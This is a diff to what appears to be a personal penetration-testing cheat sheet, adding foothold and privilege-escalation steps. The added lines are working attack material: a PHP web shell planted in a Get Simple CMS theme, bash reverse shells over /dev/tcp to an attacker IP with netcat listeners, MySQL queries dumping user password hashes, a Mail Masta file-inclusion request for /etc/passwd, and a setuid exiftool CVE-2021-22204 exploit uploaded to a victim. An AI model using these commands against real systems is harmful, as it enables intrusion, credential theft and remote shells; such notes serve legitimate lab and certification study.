@@ -591,7 +591,25 @@ Foothold:
 			- nc -lnvp <port>
 				- ssh <name>@<IP> "bash -i >& /dev/tcp/<IP>/<port> 0>&1"
 			
-
+		- Wing FTP14 Server 4.3.8:https://www.exploit-db.com/exploits/50720
+			- You may get creds from ftp
+		- Get Simple CMS: 
+			- Go to themes: System($_GET[‘cmd’]);
+			- http://<URL>/?cmd=bash -c "bash -i >%26
+/dev/tcp/192.168.xx.xx/443 0>%261"
+		- mysql: 
+			- mysql -h 192.168.XX.110 -u <replace-this-with-DBUSER-username> -
+			p<replace-this-with-DBPASS-password>
+			- mysql> show databases;
+			- mysql> use mysql;
+			- mysql> show tables;
+			- mysql> show columns from user;
+			- mysql> select User, authentication_string from user;
+			- Save the usernames and password hashes for later use
+		- mailmasta
+			- https://www.exploit-db.com/exploits/40290
+			- http:/<IP>/wp-content/plugins/mail-
+masta/inc/campaign/count_of_send.php?pl=/etc/passwd
 -----------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
 Privelege Escalation: 
@@ -643,6 +661,16 @@ return(0);
 			
 
 		- PHPFusion 9.03.50 is running locally: https://www.exploit-db.com/exploits/49911
+		- setuid exiftool: https://github.com/convisolabs/CVE-2021-22204-exiftool
+			- https://github.com/convisolabs/CVE-2021-22204-
+exiftool/archive/refs/heads/master.zip
+			- Zip up the github repo and upload it to the victim
+			- Attacker: nc -lnvp 9001
+			- Victim
+				- unzip zifile.zip
+				- cd CVE-2021-22204-exiftool-master
+				- ./exploit.py
+				- sudo exiftool image.jpg
 			
 
 
